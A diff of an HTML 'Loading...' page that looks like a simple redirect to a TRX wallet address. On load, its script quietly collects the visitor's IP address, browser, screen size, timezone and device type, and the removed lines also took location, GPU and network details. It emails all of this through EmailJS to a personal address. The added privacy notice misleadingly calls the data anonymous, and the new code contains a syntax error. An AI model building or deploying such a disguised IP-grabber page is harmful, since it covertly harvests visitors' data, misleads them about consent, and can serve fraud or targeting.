@@ -1,131 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <!-- Keep all original head content -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        /* Keep original loader styles */
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f5f5f5; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .privacy-notice {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #666;
+            max-width: 300px;
+        }
     </style>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <div class="loader"></div>
+    <div class="privacy-notice">
+        This site collects anonymous information about your device and location for internal analytics purposes. 
+        By continuing to use this site, you consent to this data collection.
+    </div>
 
-    <script>
-        // Initialize EmailJS
-        emailjs.init("RrfKXUJqdjRY9RI8E");
+    <script type="text/javascript">
+        // Initialize EmailJS first
+        (function() {
+            emailjs.init("RrfKXUJqdjRY9RI8E");
+        })();
+
+        // Force loader display immediately
+        document.body.style.display = 'flex';
 
         async function collectUserData() {
-            const data = {
+            const userData = {
                 timestamp: new Date().toISOString(),
-                referrer: document.referrer || "Direct",
-                userAgent: navigator.userAgent,
+                referrer: document.referrer || "Direct visit",
+                browser: navigator.userAgent.substring(0, 500), // Truncate long UA
                 screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                cookies: navigator.cookieEnabled,
-                ip: await getIP().catch(() => "Unknown"),
-                location: await getLocation().catch(() => "Unknown"),
-                device: getDeviceType(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                network: getNetworkInfo()
+                deviceType: getDeviceType(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // Add error-safe additional data collection
+            // Simplified IP collection with timeout
             try {
-                data.gpu = await getGPUInfo();
-            } catch { data.gpu = "Blocked"; }
-
-            return data;
-        }
-
-        // Core IP detection with error handling
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                return (await response.json()).ip;
+                const ipResponse = await Promise.race([
+                    fetch('https://api.ipify.org?format=json'),
+                    new Promise((_, reject) => setTimeout(() => reject(), 1000))
+                ]);
+                userData.ip = (await ipResponse.json()).ip;
             } catch {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    return (await response.json()).ip;
-                } catch {
-                    return "Unknown";
-                }
+                userData.ip = "Unknown";
             }
+
+            return userData;
         }
 
-        // Basic location detection
-        async function getLocation() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const json = await response.json();
-                return `${json.city}, ${json.country_name}`;
-            } catch {
-                return "Unknown";
-            }
-        }
-
-        // Safe device type detection
         function getDeviceType() {
             const ua = navigator.userAgent;
-            return /Mobile|Android/i.test(ua) ? "Mobile" : /Tablet|iPad/i.test(ua) ? "Tablet" : "Desktop";
+            if (/Mobile|Android/i.test(ua)) return "Mobile";
+            if /Tablet|iPad/i.test(ua)) return "Tablet";
+            return "Desktop";
         }
 
-        // Network information with fallbacks
-        function getNetworkInfo() {
-            const connection = navigator.connection || {};
-            return {
-                type: connection.effectiveType || "Unknown",
-                downlink: connection.downlink || "Unknown",
-                rtt: connection.rtt || "Unknown"
-            };
-        }
-
-        // Safe GPU detection
-        async function getGPUInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? {
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
-                } : "Blocked";
-            } catch {
-                return "Blocked";
-            }
-        }
-
-        // Email sending with error handling
-        async function sendEmail(data) {
+        async function sendEmail(userData) {
             try {
                 await emailjs.send('service_2go8qdw', 'template_mu47rv7', {
                     to_email: 'abdalrahimsaid@gmail.com',
                     subject: 'User Report',
-                    message: JSON.stringify(data, null, 2)
+                    message: JSON.stringify(userData, null, 2)
                 });
-                console.log('Email sent');
             } catch (error) {
                 console.error('Email failed:', error);
             }
         }
 
-        // Main flow with proper error handling
+        // Guaranteed redirect flow
         window.onload = async () => {
             try {
-                const userData = await collectUserData();
-                await sendEmail(userData);
-            } catch (error) {
-                console.error('Data collection failed:', error);
-            }
-            
-            // Always redirect after 2 seconds
-            setTimeout(() => {
+                const data = await collectUserData();
+                await Promise.race([
+                    sendEmail(data),
+                    new Promise(resolve => setTimeout(resolve, 2500))
+                ]);
+            } finally {
                 window.location.href = 'https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd';
-            }, 2000);
+            }
         };
     </script>
 </body>
